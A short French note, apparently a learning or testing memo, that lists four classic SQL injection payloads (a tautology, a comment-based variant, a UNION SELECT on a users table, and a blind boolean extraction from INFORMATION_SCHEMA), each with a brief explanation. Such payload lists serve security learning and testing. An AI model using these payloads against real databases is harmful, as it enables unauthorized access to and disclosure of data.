# Tentative d'injection SQL dans mon code

## Exemple de cote d'injection SQL
1. Injection SQL simple :

' OR 1=1 --
Cette requête d'injection SQL est vraie pour tous les enregistrements de la base de données, ce qui peut entraîner une divulgation complète des données.

2. Injection SQL avec commentaire :

' OR 'a'='a' --
Cette requête d'injection SQL utilise des commentaires pour masquer le reste de la requête SQL.

3. Injection SQL UNION :

' UNION SELECT * FROM users --
Cette requête d'injection SQL utilise l'opérateur UNION pour combiner les résultats de deux requêtes SQL ou plus en une seule.

4. Injection SQL aveugle :

' OR ASCII(SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1),1,1))>64 --
Cette requête d'injection SQL utilise une technique d'injection SQL aveugle pour extraire des données de la base de données en envoyant une série de requêtes vraies ou fausses.
     
